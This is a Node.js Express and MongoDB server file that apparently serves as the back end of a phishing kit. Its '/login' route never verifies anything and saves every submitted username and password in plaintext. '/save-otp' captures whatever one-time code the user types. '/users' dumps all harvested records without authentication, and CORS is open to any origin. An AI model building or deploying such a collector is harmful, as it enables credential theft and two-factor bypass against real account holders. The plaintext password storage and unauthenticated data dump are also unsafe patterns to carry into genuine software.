const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();

// Middleware
app.use(express.json());
app.use(cors());

// Connect MongoDB
mongoose.connect(process.env.MONGO_URL)
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.log("❌ MongoDB error:", err));

// Schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
  otp: String
});

const User = mongoose.model("User", userSchema);

// 🔐 LOGIN → store username + password
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  const newUser = new User({ username, password });
  await newUser.save();

  res.json({ success: true });
});

// 🔢 SAVE OTP → store whatever user enters
app.post("/save-otp", async (req, res) => {
  const { username, otp } = req.body;

  await User.findOneAndUpdate(
    { username },
    { otp },
    { sort: { _id: -1 } }
  );

  res.json({ success: true });
});

// 👀 VIEW ALL USERS (for testing)
app.get("/users", async (req, res) => {
  const users = await User.find();
  res.json(users);
});

// 🚀 START SERVER
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
